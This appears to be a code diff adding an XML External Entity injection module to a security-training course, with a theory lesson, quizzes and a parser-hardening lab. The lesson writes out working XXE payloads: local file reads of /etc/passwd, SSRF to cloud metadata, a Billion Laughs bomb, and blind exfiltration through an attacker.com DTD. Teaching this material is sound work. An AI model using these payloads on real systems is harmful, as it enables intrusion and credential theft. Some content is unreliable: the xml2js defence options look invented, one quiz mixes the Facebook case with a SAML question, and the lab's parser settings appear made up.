@@ -999,5 +999,346 @@ function isPrivateIP(hostname) {
                 }
             }
         ]
+    },
+    {
+        id: 'xxe-attacks',
+        title: 'XML External Entity (XXE) Injection',
+        description: 'Master the detection and prevention of XXE attacks that exploit XML parsers to leak data, perform SSRF, and cause denial of service.',
+        difficulty: 'Advanced',
+        xpReward: 400,
+        locked: false,
+        lessons: [
+            {
+                id: 'xxe-theory',
+                title: 'Understanding XXE Attacks',
+                type: 'theory',
+                content: `
+# XML External Entity (XXE) Injection
+
+XML External Entity (XXE) injection is a web security vulnerability that allows attackers to interfere with an application's processing of XML data. It exploits features of XML parsers that allow the definition and resolution of external entities.
+
+## Mission Briefing: Understanding XML and DTDs
+
+Before we dive into the attack, let's understand the technology being exploited.
+
+### What is XML?
+
+XML (eXtensible Markup Language) is a format for storing and transporting data. Unlike HTML, XML tags are not predefined—you create your own structure:
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<user>
+  <username>agent007</username>
+  <clearance>top-secret</clearance>
+</user>
+\`\`\`
+
+### What is a DTD?
+
+A Document Type Definition (DTD) defines the structure and legal elements of an XML document. DTDs can define **entities**—variables that get replaced when the XML is parsed:
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE user [
+  <!ENTITY name "James Bond">
+]>
+<user>
+  <greeting>Hello, &name;!</greeting>
+</user>
+\`\`\`
+
+When parsed, \`&name;\` is replaced with "James Bond".
+
+### The Danger: External Entities
+
+XML allows entities to reference **external resources**—files, URLs, or other data:
+
+\`\`\`xml
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+\`\`\`
+
+When an insecure parser processes this, it reads the file and includes its contents in the response. This is XXE.
+
+## Attack Vectors
+
+### 1. Local File Disclosure
+
+The most common XXE attack—reading files from the server:
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+\`\`\`
+
+**Impact:** Source code, configuration files, credentials, private keys.
+
+### 2. Server-Side Request Forgery (SSRF via XXE)
+
+XXE can be used to make the server perform requests to internal resources:
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root><data>&xxe;</data></root>
+\`\`\`
+
+**Impact:** Access to cloud metadata, internal services, credential theft.
+
+### 3. Billion Laughs Attack (DoS)
+
+Also known as an XML bomb, this causes exponential memory expansion:
+
+\`\`\`xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<lolz>&lol5;</lolz>
+\`\`\`
+
+A small document expands to gigabytes of memory, crashing the server.
+
+### 4. Blind XXE
+
+When error messages are suppressed, attackers use out-of-band (OOB) techniques to exfiltrate data:
+
+\`\`\`xml
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+\`\`\`
+
+## Case Files: Real-World Breaches
+
+### Facebook XXE Vulnerability (2014)
+**Impact:** Access to internal Facebook files
+
+Security researcher Reginaldo Silva discovered that Facebook's "Forgot Password" feature parsed XML using a vulnerable parser. The researcher was able to:
+1. Read files from Facebook's servers
+2. Make requests to internal services
+3. Potentially access sensitive credentials
+
+Facebook awarded a $33,500 bug bounty—one of their largest at the time.
+
+### XXE in SAML Implementations
+**Impact:** Authentication bypass across enterprise applications
+
+SAML (Security Assertion Markup Language) uses XML for single sign-on (SSO). Multiple SAML implementations have been vulnerable to XXE:
+- OneLogin (2017)
+- Duo Security
+- Multiple ADFS implementations
+
+Attackers could forge authentication tokens or extract secrets from identity providers.
+
+### Microsoft Word XXE (2018)
+**Impact:** Credential theft from corporate networks
+
+Microsoft Word's DOCX format uses XML internally. Attackers sent malicious Word documents that, when opened, would:
+1. Use XXE to connect to an attacker's SMB server
+2. The victim's Windows system would send NTLM credentials
+3. Attackers could crack or relay these credentials
+
+## Defense Strategies
+
+### 1. Disable DTD Processing Entirely
+
+The safest option—completely disable DTD and external entity processing:
+
+**JavaScript (node-xml2js):**
+\`\`\`javascript
+const parser = new xml2js.Parser({
+  explicitEntities: false,
+  entityExpansion: false
+});
+\`\`\`
+
+**Java:**
+\`\`\`java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+\`\`\`
+
+**Python (defusedxml):**
+\`\`\`python
+import defusedxml.ElementTree as ET
+tree = ET.parse('data.xml')  # Safe by default
+\`\`\`
+
+### 2. Disable External Entities Specifically
+
+If you need DTDs but not external entities:
+
+**Java:**
+\`\`\`java
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+\`\`\`
+
+### 3. Use Safe XML Libraries
+
+Choose libraries that are secure by default:
+- **Python:** \`defusedxml\` instead of \`xml.etree\`
+- **JavaScript:** \`fast-xml-parser\` with entity expansion disabled
+- **Java:** Configure factories with security features enabled
+
+### 4. Input Validation
+
+Reject XML containing DTD declarations:
+
+\`\`\`javascript
+if (xmlInput.includes('<!DOCTYPE') || xmlInput.includes('<!ENTITY')) {
+  throw new Error('DTD processing is not allowed');
+}
+\`\`\`
+
+## Key Takeaways
+
+1. **XXE exploits XML parser features**, not bugs—DTDs and external entities are "working as designed"
+2. **Disable DTD processing** in production applications when possible
+3. **Use secure-by-default libraries** like defusedxml (Python) or properly configured parsers
+4. **Defense in depth**: Combine parser configuration with input validation
+5. **Modern formats like JSON** don't have entity features and are inherently safer for data exchange
+                `
+            },
+            {
+                id: 'xxe-quiz-1',
+                title: 'XXE Fundamentals Assessment',
+                type: 'quiz',
+                content: '',
+                quiz: {
+                    question: "What feature of XML does XXE exploit?",
+                    options: [
+                        "XML namespaces that allow cross-origin data access",
+                        "External entity declarations in DTDs that reference files or URLs",
+                        "XPath queries that can be injected like SQL",
+                        "XML schema validation that exposes internal errors"
+                    ],
+                    correctAnswer: 1,
+                    explanation: "XXE exploits the XML feature of external entities defined in DTDs. When a parser resolves an entity like <!ENTITY xxe SYSTEM 'file:///etc/passwd'>, it reads the file and includes its contents in the parsed document."
+                }
+            },
+            {
+                id: 'xxe-quiz-2',
+                title: 'Attack Vector Recognition',
+                type: 'quiz',
+                content: '',
+                quiz: {
+                    question: "An attacker sends XML containing: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>. What attack is being attempted?",
+                    options: [
+                        "SQL Injection to access the database",
+                        "XSS to inject malicious scripts",
+                        "SSRF via XXE to access cloud metadata credentials",
+                        "CSRF to forge authenticated requests"
+                    ],
+                    correctAnswer: 2,
+                    explanation: "This is Server-Side Request Forgery (SSRF) performed via XXE. The attacker is using the XML parser to make a request to the AWS metadata endpoint (169.254.169.254), attempting to steal IAM credentials. XXE provides a vector for SSRF attacks."
+                }
+            },
+            {
+                id: 'xxe-quiz-3',
+                title: 'Billion Laughs Analysis',
+                type: 'quiz',
+                content: '',
+                quiz: {
+                    question: "The 'Billion Laughs' attack (XML bomb) works by:",
+                    options: [
+                        "Sending a billion HTTP requests to overwhelm the server",
+                        "Using nested entity definitions that expand exponentially in memory",
+                        "Including malicious JavaScript that runs in an infinite loop",
+                        "Exploiting buffer overflow in the XML parser code"
+                    ],
+                    correctAnswer: 1,
+                    explanation: "The Billion Laughs attack defines entities that reference other entities in a nested pattern. When expanded, a few kilobytes of XML can consume gigabytes of memory: each 'lol' entity expands to 10 references, which each expand to 10 more, creating exponential growth."
+                }
+            },
+            {
+                id: 'xxe-quiz-4',
+                title: 'Defense Strategy Evaluation',
+                type: 'quiz',
+                content: '',
+                quiz: {
+                    question: "Which is the MOST effective defense against XXE attacks?",
+                    options: [
+                        "Encoding XML special characters in input",
+                        "Using HTTPS for all XML data transfers",
+                        "Disabling DTD processing and external entity resolution in the parser",
+                        "Validating XML against a strict schema"
+                    ],
+                    correctAnswer: 2,
+                    explanation: "The most effective defense is to disable DTD processing entirely, or at minimum disable external entity resolution. This prevents the parser from ever attempting to resolve external references. Schema validation and encoding do not prevent XXE if the parser still resolves entities."
+                }
+            },
+            {
+                id: 'xxe-quiz-5',
+                title: 'Real-World Breach Analysis',
+                type: 'quiz',
+                content: '',
+                quiz: {
+                    question: "In the 2014 Facebook XXE vulnerability discovered in their 'Forgot Password' feature, what made SAML implementations particularly susceptible to XXE?",
+                    options: [
+                        "SAML uses JSON which is vulnerable to entity expansion",
+                        "SAML is an XML-based protocol, and many parsers processed DTDs by default",
+                        "SAML passwords are stored in plaintext",
+                        "SAML implementations use weak encryption"
+                    ],
+                    correctAnswer: 1,
+                    explanation: "SAML (Security Assertion Markup Language) is XML-based by design. Many SAML implementations used XML parsers with default settings that processed DTDs and resolved external entities. Since SAML handles authentication, XXE vulnerabilities could lead to authentication bypass or credential theft."
+                }
+            },
+            {
+                id: 'xxe-lab',
+                title: 'Secure the XML Parser',
+                type: 'lab',
+                content: 'The code below uses an XML parser with insecure default settings. Your mission: Configure the parser to disable external entity processing and DTD handling to prevent XXE attacks.',
+                lab: {
+                    initialCode: `
+function parseUserXml(xmlInput) {
+  // VULNERABLE: Parser uses insecure defaults
+  const parser = new XMLParser({
+    // No security configuration!
+  });
+
+  const result = parser.parse(xmlInput);
+  return result;
+}
+                    `,
+                    solutionCode: `
+function parseUserXml(xmlInput) {
+  // SECURE: Reject DTD declarations in input
+  if (xmlInput.includes('<!DOCTYPE') || xmlInput.includes('<!ENTITY')) {
+    throw new Error('DTD and entities are not allowed');
+  }
+
+  // SECURE: Configure parser to disable dangerous features
+  const parser = new XMLParser({
+    allowDtd: false,
+    resolveExternalEntities: false,
+    processEntities: false,
+    expandEntityReferences: false
+  });
+
+  const result = parser.parse(xmlInput);
+  return result;
+}
+                    `,
+                    instructions: "Secure the XML parser against XXE:\n1. Add input validation to reject XML containing '<!DOCTYPE' or '<!ENTITY' (throw 'DTD and entities are not allowed')\n2. Configure the parser with these security options:\n   - allowDtd: false\n   - resolveExternalEntities: false\n   - processEntities: false\n   - expandEntityReferences: false"
+                }
+            }
+        ]
     }
 ];
